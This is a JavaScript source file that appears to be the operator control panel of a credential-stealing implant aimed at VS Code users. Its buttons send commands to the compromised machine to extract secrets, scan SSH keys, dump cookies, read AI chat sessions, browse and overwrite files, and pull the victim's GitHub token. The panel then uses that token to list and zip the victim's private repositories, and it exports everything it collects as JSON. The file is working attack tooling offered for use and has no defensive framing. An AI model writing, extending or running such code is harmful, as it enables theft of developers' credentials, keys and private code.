    for (var i = 0; i < filtered.length; i++) {
        var r = filtered[i];
        var vis = r.private ? '<span class="badge bg-danger">private</span>' : '<span class="badge bg-success">public</span>';
        var updated = r.updated_at ? new Date(r.updated_at).toLocaleDateString() : '';
        html += '<tr>' +
            '<td style="font-family:monospace;font-size:0.85em"><span class="text-white">' + esc(r.full_name) + '</span>' +
            (r.fork ? ' <span class="badge bg-secondary">fork</span>' : '') +
            (r.description ? '<div class="text-muted" style="font-size:0.85em">' + esc(r.description.substring(0, 80)) + '</div>' : '') +
            '</td>' +
            '<td>' + vis + '</td>' +
            '<td class="small">' + esc(r.language || '') + '</td>' +
            '<td class="small">' + (r.stargazers_count || 0) + '</td>' +
            '<td class="small">' + esc(updated) + '</td>' +
            '<td><button class="btn btn-primary btn-sm py-0 px-1 vsc-gh-dl-repo-btn" data-repo="' + esc(r.full_name) + '" style="font-size:0.75em" title="Download zip of ' + esc(r.full_name) + '">Zip</button></td>' +
            '</tr>';
    }

    html += '</tbody></table></div>';
    el.innerHTML = html;

    // Wire repo download buttons
    var dlBtns = el.querySelectorAll('.vsc-gh-dl-repo-btn');
    for (var db = 0; db < dlBtns.length; db++) {
        (function(btn) {
            btn.onclick = function() {
                var repo = btn.getAttribute('data-repo');
                sendCommand({ action: 'github_download_repo', repo: repo });
                btn.disabled = true;
                btn.textContent = '...';
                _pendingRepoDownload = true;
                _pendingRepoName = repo;
                // Timeout fallback
                setTimeout(function() {
                    if (_pendingRepoDownload && _pendingRepoName === repo) {
                        _pendingRepoDownload = false;
                        btn.disabled = false;
                        btn.textContent = 'Zip';
                    }
                }, 120000);
            };
        })(dlBtns[db]);
    }
}

function renderGitHubOrgs(data) {
    if (Array.isArray(data)) githubOrgs = data;
    var el = pluginUI.container.querySelector('#vsc-gh-orgs');
    if (!el) return;

    if (!githubOrgs || githubOrgs.length === 0) {
        el.innerHTML = '<span class="text-muted">No organizations</span>';
        return;
    }

    var html = '';
    for (var i = 0; i < githubOrgs.length; i++) {
        var o = githubOrgs[i];
        html += '<div class="d-flex align-items-center mb-1" style="gap:8px">';
        html += '<span class="text-white vsc-gh-org-link" data-org="' + esc(o.login) + '" style="cursor:pointer">' + esc(o.login) + '</span>';
        html += '<button class="btn btn-primary btn-sm py-0 px-1 vsc-gh-org-repos-btn" data-org="' + esc(o.login) + '" style="font-size:0.75em">Load Repos</button>';
        if (o.description) html += ' <span class="text-muted small">' + esc(o.description) + '</span>';
        html += '</div>';
    }

    el.innerHTML = html;

    // Wire org repo buttons
    var orgBtns = el.querySelectorAll('.vsc-gh-org-repos-btn');
    for (var ob = 0; ob < orgBtns.length; ob++) {
        (function(btn) {
            btn.onclick = function() {
                var org = btn.getAttribute('data-org');
                sendCommand({ action: 'github_api', endpoint: '/orgs/' + org + '/repos?per_page=100&sort=updated' });
                btn.disabled = true;
                btn.textContent = '...';
                _pendingGithubApi = true;
                _pendingGithubEndpoint = '/orgs/' + org + '/repos?per_page=100&sort=updated';
                var reposEl = pluginUI.container.querySelector('#vsc-gh-repos');
                if (reposEl) reposEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching ' + esc(org) + ' repos...';
                // Reset button after timeout
                setTimeout(function() { btn.disabled = false; btn.textContent = 'Load Repos'; }, 15000);
            };
        })(orgBtns[ob]);
    }
}

// ===== Zip Download =====

function crc32(bytes) {
    var table = [];
    for (var n = 0; n < 256; n++) {
        var c = n;
        for (var k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
        table[n] = c;
    }
    var crc = 0xFFFFFFFF;
    for (var i = 0; i < bytes.length; i++) crc = table[(crc ^ bytes[i]) & 0xFF] ^ (crc >>> 8);
    return (crc ^ 0xFFFFFFFF) >>> 0;
}

function buildZip(files) {
    // files = [{path: 'relative/path.js', content: 'string'}]
    var enc = new TextEncoder();
    var localParts = [];
    var centralParts = [];
    var offset = 0;

    for (var i = 0; i < files.length; i++) {
        var nameBytes = enc.encode(files[i].path);
        var contentBytes = enc.encode(files[i].content);
        var crc = crc32(contentBytes);

        // Local file header (30 bytes + name + content)
        var local = new Uint8Array(30 + nameBytes.length);
        var lv = new DataView(local.buffer);
        lv.setUint32(0, 0x04034b50, true);
        lv.setUint16(4, 20, true);
        lv.setUint16(8, 0, true); // store, no compression
        lv.setUint32(14, crc, true);
        lv.setUint32(18, contentBytes.length, true);
        lv.setUint32(22, contentBytes.length, true);
        lv.setUint16(26, nameBytes.length, true);
        local.set(nameBytes, 30);
        localParts.push(local, contentBytes);

        // Central directory entry (46 bytes + name)
        var cd = new Uint8Array(46 + nameBytes.length);
        var cv = new DataView(cd.buffer);
        cv.setUint32(0, 0x02014b50, true);
        cv.setUint16(4, 20, true);
        cv.setUint16(6, 20, true);
        cv.setUint16(10, 0, true);
        cv.setUint32(16, crc, true);
        cv.setUint32(20, contentBytes.length, true);
        cv.setUint32(24, contentBytes.length, true);
        cv.setUint16(28, nameBytes.length, true);
        cv.setUint32(42, offset, true);
        cd.set(nameBytes, 46);
        centralParts.push(cd);

        offset += local.length + contentBytes.length;
    }

    var cdSize = 0;
    for (var c = 0; c < centralParts.length; c++) cdSize += centralParts[c].length;

    // End of central directory (22 bytes)
    var eocd = new Uint8Array(22);
    var ev = new DataView(eocd.buffer);
    ev.setUint32(0, 0x06054b50, true);
    ev.setUint16(8, files.length, true);
    ev.setUint16(10, files.length, true);
    ev.setUint32(12, cdSize, true);
    ev.setUint32(16, offset, true);

    // Combine all parts
    var total = offset + cdSize + 22;
    var result = new Uint8Array(total);
    var pos = 0;
    var allParts = localParts.concat(centralParts, [eocd]);
    for (var p = 0; p < allParts.length; p++) {
        result.set(allParts[p], pos);
        pos += allParts[p].length;
    }
    return result;
}

function handleBulkDownload(data) {
    if (!data || !data.files || data.files.length === 0) return;

    // Build zip from file contents
    var zipFiles = [];
    for (var i = 0; i < data.files.length; i++) {
        var f = data.files[i];
        if (!f.content) continue; // skip errored files
        // Use relative path from common prefix
        var name = f.path;
        // Strip leading slash for zip paths
        if (name[0] === '/') name = name.substring(1);
        zipFiles.push({ path: name, content: f.content });
    }

    if (zipFiles.length === 0) return;

    var zipData = buildZip(zipFiles);
    var blob = new Blob([zipData], { type: 'application/zip' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'vscode_open_files_' + Date.now() + '.zip';
    a.click();
    URL.revokeObjectURL(url);
}

// ===== Repo Archive Download =====

function handleRepoArchiveDownload(data) {
    if (!data || !data.data) return;

    // Decode base64 to binary
    var raw = atob(data.data);
    var bytes = new Uint8Array(raw.length);
    for (var i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

    var blob = new Blob([bytes], { type: 'application/zip' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = data.filename || 'repo.zip';
    a.click();
    URL.revokeObjectURL(url);
}

// ===== Errors =====

function renderErrors() {
    var tbody = pluginUI.container.querySelector('#vsc-errors-body');
    if (!tbody) return;

    if (allErrors.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" class="text-muted">No errors</td></tr>';
        return;
    }

    var html = '';
    for (var i = 0; i < allErrors.length; i++) {
        var row = allErrors[i];
        var d = row.data || {};
        var ts = row.timeStamp ? new Date(row.timeStamp).toLocaleString() : '';
        html += '<tr>' +
            '<td>' + esc(d.phase || '') + '</td>' +
            '<td class="small" style="max-width:500px;word-break:break-all">' + esc(d.error || JSON.stringify(d)) + '</td>' +
            '<td class="small">' + esc(ts) + '</td>' +
            '</tr>';
    }
    tbody.innerHTML = html;
}

function renderDebugData(rows) {
    var container = pluginUI.container.querySelector('#vsc-tab-errors');
    if (!container) return;

    // Check if debug section already exists
    var debugSection = container.querySelector('#vsc-debug-section');
    if (!debugSection) {
        debugSection = document.createElement('div');
        debugSection.id = 'vsc-debug-section';
        debugSection.className = 'mt-3';
        container.appendChild(debugSection);
    }

    var html = '<h6 class="text-white mb-2">Debug Data</h6>';
    for (var i = 0; i < rows.length; i++) {
        var d = rows[i].data || {};
        var ts = rows[i].timeStamp ? new Date(rows[i].timeStamp).toLocaleString() : '';

        if (d.phase === 'bootstrap') {
            html += '<div class="card mb-2"><div class="card-body p-2">' +
                '<span class="text-muted small">Bootstrap (' + esc(ts) + ')</span>' +
                '<div style="font-size:0.85em">' +
                '<div><span class="text-muted">userData:</span> <span class="text-white">' + esc(d.userData) + '</span></div>' +
                '<div><span class="text-muted">workspace:</span> <span class="text-white">' + esc(d.workspacePath || 'NOT FOUND') + '</span></div>' +
                '<div><span class="text-muted">storageHash:</span> <span class="text-white">' + esc(d.workspaceStorageHash || 'NOT FOUND') + '</span></div>' +
                '<div><span class="text-muted">platform:</span> <span class="text-white">' + esc(d.platform) + '</span></div>' +
                '</div></div></div>';
        } else {
            // Key dump
            html += '<div class="card mb-2"><div class="card-body p-2">' +
                '<span class="text-muted small">Key Dump (' + esc(ts) + ')</span>';

            if (d.globalKeys && d.globalKeys.length > 0) {
                html += '<div class="mt-1"><span class="badge bg-secondary">' + d.globalKeys.length + ' global keys</span></div>' +
                    '<pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.75em;max-height:200px;overflow:auto;margin:4px 0">' +
                    esc(d.globalKeys.join('\n')) + '</pre>';
            }

            if (d.workspaceKeys && d.workspaceKeys.length > 0) {
                html += '<div class="mt-1"><span class="badge bg-secondary">' + d.workspaceKeys.length + ' workspace keys</span></div>' +
                    '<pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.75em;max-height:200px;overflow:auto;margin:4px 0">' +
                    esc(d.workspaceKeys.join('\n')) + '</pre>';
            }

            if (d.allWorkspaceDirs && d.allWorkspaceDirs.length > 0) {
                html += '<div class="mt-1"><span class="badge bg-secondary">' + d.allWorkspaceDirs.length + ' workspace storage dirs</span></div>' +
                    '<pre style="background:#1e1e1e;padding:6px;border-radius:4px;font-size:0.75em;max-height:100px;overflow:auto;margin:4px 0">' +
                    esc(d.allWorkspaceDirs.join('\n')) + '</pre>';
            }

            html += '</div></div>';
        }
    }

    debugSection.innerHTML = html;
}

// ===== Data loading =====

function loadAllData() {
    if (!pluginUI.container || !pluginUI.container.parentNode) {
        if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
        return;
    }

    // Project info
    pluginUI.fetchData('project_info', 10, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            projectInfo = rows[0].data;
            renderProject();
            renderFilesOpenBar();
            if (_syncState !== 'connected') {
                updateSyncStatus('connected', 'Connected — ' + (projectInfo.workspacePath || 'VS Code'));
            }
        }
    });

    // Git info
    pluginUI.fetchData('git_info', 10, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            gitInfo = rows[0].data;
            renderGitInfo();
        }
    });

    // Secrets
    pluginUI.fetchData('secrets', 10, 0).then(function(result) {
        allSecrets = result.rows || [];
        renderSecrets();
    });

    // SSH Keys
    pluginUI.fetchData('ssh_keys', 10, 0).then(function(result) {
        allSSHKeys = result.rows || [];
        renderSSHKeys();
    });

    // Cookies
    pluginUI.fetchData('cookies', 10, 0).then(function(result) {
        allCookies = result.rows || [];
        renderCookies();
    });

    // Chat sessions
    pluginUI.fetchData('chat_sessions', 10, 0).then(function(result) {
        chatSessions = result.rows || [];
        renderChatSessions();
    });

    // Dir listing (check for new responses)
    if (_pendingDirRequest) {
        pluginUI.fetchData('dir_listing', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                renderDirListing(rows[0].data);
                _pendingDirRequest = false;
            }
        });
    }

    // File content (check for new responses)
    if (_pendingFileRequest) {
        pluginUI.fetchData('file_content', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var latest = rows[0].data;
                if (latest.filePath === currentFilePath) {
                    renderFileContent(latest);
                    _pendingFileRequest = false;
                }
            }
        });
    }

    // Chat history (check for new responses)
    if (_pendingChatRequest) {
        pluginUI.fetchData('chat_history', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                renderChatHistory(rows[0].data);
                _pendingChatRequest = false;
            }
        });
    }

    // Bulk file download (check for response)
    if (_pendingBulkDownload) {
        pluginUI.fetchData('bulk_files', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                handleBulkDownload(rows[0].data);
                _pendingBulkDownload = false;
                var dlBtn = pluginUI.container.querySelector('#vsc-download-open-btn');
                if (dlBtn) { dlBtn.disabled = false; dlBtn.textContent = 'Download Open Files'; }
            }
        });
    }

    // GitHub token (check for response)
    if (_pendingGithubToken) {
        pluginUI.fetchData('github_token', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                renderGitHubToken(rows[0].data);
                _pendingGithubToken = false;
                var btn = pluginUI.container.querySelector('#vsc-gh-extract-btn');
                if (btn) { btn.disabled = false; btn.textContent = 'Extract Token'; }
            }
        });
    }

    // GitHub API data (check for response)
    if (_pendingGithubApi) {
        pluginUI.fetchData('github_data', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var d = rows[0].data;
                if (d.endpoint === _pendingGithubEndpoint) {
                    _pendingGithubApi = false;
                    if (d.endpoint === '/user') {
                        renderGitHubUser(d.data || { error: d.error });
                        var btn = pluginUI.container.querySelector('#vsc-gh-user-btn');
                        if (btn) { btn.disabled = false; btn.textContent = 'Load User'; }
                    } else if (d.endpoint === '/user/repos?per_page=100&sort=updated' || d.endpoint.indexOf('/orgs/') === 0) {
                        if (d.error) {
                            var repoEl = pluginUI.container.querySelector('#vsc-gh-repos');
                            if (repoEl) {
                                var errMsg = esc(d.error);
                                if (d.tokenScopes) errMsg += '<br><small class="text-muted">Token scopes: ' + esc(d.tokenScopes) + '</small>';
                                if (d.body) errMsg += '<br><small class="text-muted">' + esc(d.body.substring(0, 200)) + '</small>';
                                repoEl.innerHTML = '<span class="text-danger">' + errMsg + '</span>';
                            }
                        } else {
                            renderGitHubRepos(d.data || []);
                            // Show scope hint when repos are empty — helps diagnose token scope issues
                            if ((!d.data || d.data.length === 0) && d.tokenScopes) {
                                var scopeEl = pluginUI.container.querySelector('#vsc-gh-repos');
                                if (scopeEl) {
                                    scopeEl.innerHTML += '<br><small class="text-muted">Token scopes: ' + esc(d.tokenScopes) +
                                        (d.tokenScopes.indexOf('repo') === -1 ? ' — missing <strong>repo</strong> scope (only public repos visible)' : '') + '</small>';
                                }
                            }
                        }
                        var btn2 = pluginUI.container.querySelector('#vsc-gh-repos-btn');
                        if (btn2) { btn2.disabled = false; btn2.textContent = 'Load Repos'; }
                        // Re-enable any org repo buttons
                        var orgBtns = pluginUI.container.querySelectorAll('.vsc-gh-org-repos-btn');
                        for (var ob = 0; ob < orgBtns.length; ob++) {
                            orgBtns[ob].disabled = false;
                            orgBtns[ob].textContent = 'Load Repos';
                        }
                    } else if (d.endpoint === '/user/orgs') {
                        renderGitHubOrgs(d.data || []);
                        var btn3 = pluginUI.container.querySelector('#vsc-gh-orgs-btn');
                        if (btn3) { btn3.disabled = false; btn3.textContent = 'Load Orgs'; }
                    }
                }
            }
        });
    }

    // Errors
    pluginUI.fetchData('_error', 100, 0).then(function(result) {
        allErrors = result.rows || [];
        renderErrors();
        var errTab = pluginUI.container.querySelector('[data-vsc-tab="errors"]');
        if (errTab && allErrors.length > 0) {
            errTab.innerHTML = 'Errors <span class="badge bg-danger">' + allErrors.length + '</span>';
        }
        if (allErrors.length > 0 && !projectInfo && _syncState === 'syncing') {
            updateSyncStatus('error', 'Errors — check Errors tab');
        }
    });

    // Repo archive download (check for response)
    if (_pendingRepoDownload) {
        pluginUI.fetchData('repo_archive', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var d = rows[0].data;
                if (d.repo === _pendingRepoName) {
                    _pendingRepoDownload = false;
                    handleRepoArchiveDownload(d);
                    // Re-enable the button
                    var btns = pluginUI.container.querySelectorAll('.vsc-gh-dl-repo-btn');
                    for (var b = 0; b < btns.length; b++) {
                        if (btns[b].getAttribute('data-repo') === d.repo) {
                            btns[b].disabled = false;
                            btns[b].textContent = 'Zip';
                        }
                    }
                }
            }
        });
    }

    // Debug data (shown in errors tab)
    pluginUI.fetchData('_debug', 10, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) renderDebugData(rows);
    });
}

// ===== Wire buttons =====

// Refresh (project)
var refreshBtn = pluginUI.container.querySelector('#vsc-refresh-btn');
if (refreshBtn) {
    refreshBtn.onclick = function() {
        sendCommand({ action: 'refresh' });
        refreshBtn.disabled = true;
        refreshBtn.textContent = 'Refreshing...';
        setTimeout(function() {
            refreshBtn.disabled = false;
            refreshBtn.textContent = 'Refresh';
        }, 3000);
    };
}

// Clear data
var clearBtn = pluginUI.container.querySelector('#vsc-clear-btn');
if (clearBtn) {
    clearBtn.onclick = function() {
        if (confirm('Clear all collected VS Code data?')) {
            pluginUI.deleteData().then(function() { loadAllData(); });
        }
    };
}

// Export JSON
var exportBtn = pluginUI.container.querySelector('#vsc-export-btn');
if (exportBtn) {
    exportBtn.onclick = function() {
        var exportData = {
            project: projectInfo,
            git: gitInfo,
            secrets: allSecrets.map(function(r) { return r.data; }),
            sshKeys: allSSHKeys.map(function(r) { return r.data; }),
            cookies: allCookies.map(function(r) { return r.data; }),
            chatSessions: chatSessions.map(function(r) { return r.data; }),
            errors: allErrors.map(function(r) { return r.data; }),
            exportedAt: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = url;
        a.download = 'vscode_extract_' + Date.now() + '.json';
        a.click();
        URL.revokeObjectURL(url);
    };
}

// Git collect
var gitRefreshBtn = pluginUI.container.querySelector('#vsc-git-refresh-btn');
if (gitRefreshBtn) {
    gitRefreshBtn.onclick = function() {
        sendCommand({ action: 'collect_git' });
        gitRefreshBtn.disabled = true;
        gitRefreshBtn.textContent = 'Collecting...';
        setTimeout(function() {
            gitRefreshBtn.disabled = false;
            gitRefreshBtn.textContent = 'Collect Git Info';
        }, 3000);
    };
}

// Secrets
var secretsBtn = pluginUI.container.querySelector('#vsc-secrets-btn');
if (secretsBtn) {
    secretsBtn.onclick = function() {
        sendCommand({ action: 'collect_secrets' });
        secretsBtn.disabled = true;
        secretsBtn.textContent = 'Extracting...';
        setTimeout(function() {
            secretsBtn.disabled = false;
            secretsBtn.textContent = 'Extract Secrets';
        }, 3000);
    };
}

// SSH Keys
var sshBtn = pluginUI.container.querySelector('#vsc-ssh-btn');
if (sshBtn) {
    sshBtn.onclick = function() {
        sendCommand({ action: 'collect_ssh' });
        sshBtn.disabled = true;
        sshBtn.textContent = 'Scanning...';
        setTimeout(function() {
            sshBtn.disabled = false;
            sshBtn.textContent = 'Scan SSH Keys';
        }, 3000);
    };
}

// Cookies
var cookiesBtn = pluginUI.container.querySelector('#vsc-cookies-btn');
if (cookiesBtn) {
    cookiesBtn.onclick = function() {
        sendCommand({ action: 'collect_cookies' });
        cookiesBtn.disabled = true;
        cookiesBtn.textContent = 'Dumping...';
        setTimeout(function() {
            cookiesBtn.disabled = false;
            cookiesBtn.textContent = 'Dump Cookies';
        }, 3000);
    };
}

// Chat sessions scan
var chatRefreshBtn = pluginUI.container.querySelector('#vsc-chat-refresh-btn');
if (chatRefreshBtn) {
    chatRefreshBtn.onclick = function() {
        sendCommand({ action: 'list_chat_sessions' });
        chatRefreshBtn.disabled = true;
        chatRefreshBtn.textContent = 'Scanning...';
        setTimeout(function() {
            chatRefreshBtn.disabled = false;
            chatRefreshBtn.textContent = 'Scan Sessions';
        }, 3000);
    };
}

// File browser — directory navigation
var dirGoBtn = pluginUI.container.querySelector('#vsc-dir-go-btn');
var dirInput = pluginUI.container.querySelector('#vsc-dir-input');
if (dirGoBtn && dirInput) {
    dirGoBtn.onclick = function() {
        var dirPath = dirInput.value.trim();
        if (dirPath) navigateDir(dirPath);
    };
    dirInput.onkeydown = function(e) {
        if (e.key === 'Enter') dirGoBtn.click();
    };
}

// Directory up
var dirUpBtn = pluginUI.container.querySelector('#vsc-dir-up-btn');
if (dirUpBtn) {
    dirUpBtn.onclick = function() {
        if (!currentDir) return;
        var sep = currentDir.indexOf('\\') !== -1 ? '\\' : '/';
        var parts = currentDir.split(sep);
        parts.pop();
        var parent = parts.join(sep) || sep;
        navigateDir(parent);
    };
}

// Read file by path
var readFileBtn = pluginUI.container.querySelector('#vsc-read-file-btn');
var filePathInput = pluginUI.container.querySelector('#vsc-file-path-input');
if (readFileBtn && filePathInput) {
    readFileBtn.onclick = function() {
        var filePath = filePathInput.value.trim();
        if (filePath) readFileFromBrowser(filePath);
    };
    filePathInput.onkeydown = function(e) {
        if (e.key === 'Enter') readFileBtn.click();
    };
}

// Expand button — open current file in modal
var expandBtn = pluginUI.container.querySelector('#vsc-expand-btn');
if (expandBtn) {
    expandBtn.onclick = function() {
        if (currentFilePath) openCodeModal(currentFilePath);
    };
}

// Modal: Enable Editing button
var modalEditBtn = pluginUI.container.querySelector('#vsc-modal-enable-edit-btn');
if (modalEditBtn) {
    modalEditBtn.onclick = function() {
        toggleModalEdit(true);
    };
}

// Modal: Save button
var modalSaveBtn = pluginUI.container.querySelector('#vsc-modal-save-btn');
if (modalSaveBtn) {
    modalSaveBtn.onclick = function() {
        var editArea = pluginUI.container.querySelector('#vsc-modal-edit-area');
        if (!modalFilePath || !editArea) return;

        var newContent = editArea.value;
        sendCommand({ action: 'write_file', filePath: modalFilePath, content: newContent });
        modalSaveBtn.disabled = true;
        modalSaveBtn.textContent = 'Saving...';

        setTimeout(function() {
            modalSaveBtn.disabled = false;
            modalSaveBtn.textContent = 'Save';
            modalFileContent = newContent;
            toggleModalEdit(false);
            renderCodeModal({ filePath: modalFilePath, content: newContent, size: newContent.length });
        }, 1500);
    };
}

// Modal: Cancel button
var modalCancelBtn = pluginUI.container.querySelector('#vsc-modal-cancel-edit-btn');
if (modalCancelBtn) {
    modalCancelBtn.onclick = function() {
        toggleModalEdit(false);
    };
}

// Download Open Files (zip)
var downloadOpenBtn = pluginUI.container.querySelector('#vsc-download-open-btn');
if (downloadOpenBtn) {
    downloadOpenBtn.onclick = function() {
        sendCommand({ action: 'download_open_files' });
        downloadOpenBtn.disabled = true;
        downloadOpenBtn.textContent = 'Downloading...';
        _pendingBulkDownload = true;
        // Timeout fallback
        setTimeout(function() {
            if (_pendingBulkDownload) {
                _pendingBulkDownload = false;
                downloadOpenBtn.disabled = false;
                downloadOpenBtn.textContent = 'Download Open Files';
            }
        }, 15000);
    };
}

// GitHub: Extract Token
var ghExtractBtn = pluginUI.container.querySelector('#vsc-gh-extract-btn');
if (ghExtractBtn) {
    ghExtractBtn.onclick = function() {
        sendCommand({ action: 'github_extract_token' });
        ghExtractBtn.disabled = true;
        ghExtractBtn.textContent = 'Extracting...';
        _pendingGithubToken = true;
        var statusEl = pluginUI.container.querySelector('#vsc-gh-token-status');
        if (statusEl) statusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Searching...';
    };
}

// GitHub: Load User
var ghUserBtn = pluginUI.container.querySelector('#vsc-gh-user-btn');
if (ghUserBtn) {
    ghUserBtn.onclick = function() {
        sendCommand({ action: 'github_api', endpoint: '/user' });
        ghUserBtn.disabled = true;
        ghUserBtn.textContent = 'Loading...';
        _pendingGithubApi = true;
        _pendingGithubEndpoint = '/user';
        var el = pluginUI.container.querySelector('#vsc-gh-user-info');
        if (el) el.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching...';
    };
}

// GitHub: Load Repos
var ghReposBtn = pluginUI.container.querySelector('#vsc-gh-repos-btn');
if (ghReposBtn) {
    ghReposBtn.onclick = function() {
        sendCommand({ action: 'github_api', endpoint: '/user/repos?per_page=100&sort=updated' });
        ghReposBtn.disabled = true;
        ghReposBtn.textContent = 'Loading...';
        _pendingGithubApi = true;
        _pendingGithubEndpoint = '/user/repos?per_page=100&sort=updated';
        var el = pluginUI.container.querySelector('#vsc-gh-repos');
        if (el) el.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching repos...';
    };
}

// GitHub: Load Orgs
var ghOrgsBtn = pluginUI.container.querySelector('#vsc-gh-orgs-btn');
if (ghOrgsBtn) {
    ghOrgsBtn.onclick = function() {
        sendCommand({ action: 'github_api', endpoint: '/user/orgs' });
        ghOrgsBtn.disabled = true;
        ghOrgsBtn.textContent = 'Loading...';
        _pendingGithubApi = true;
        _pendingGithubEndpoint = '/user/orgs';
        var el = pluginUI.container.querySelector('#vsc-gh-orgs');
        if (el) el.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching orgs...';
    };
}

// GitHub: Repo filter (live)
var ghRepoFilter = pluginUI.container.querySelector('#vsc-gh-repo-filter');
if (ghRepoFilter) {
    ghRepoFilter.oninput = function() {
        if (githubRepos.length > 0) renderGitHubRepos(null);
    };
}

// Debug button
var debugBtn = pluginUI.container.querySelector('#vsc-debug-btn');
if (debugBtn) {
    debugBtn.onclick = function() {
        sendCommand({ action: 'debug_dump_keys' });
        debugBtn.disabled = true;
        debugBtn.textContent = 'Dumping...';
        setTimeout(function() {
            debugBtn.disabled = false;
            debugBtn.textContent = 'Debug';
        }, 3000);
        // Switch to errors tab so the user can see the output
        var errTab = pluginUI.container.querySelector('[data-vsc-tab="errors"]');
        if (errTab) errTab.click();
    };
}

// ===== Initial load + auto-refresh =====
loadAllData();
_refreshTimer = setInterval(loadAllData, 5000);
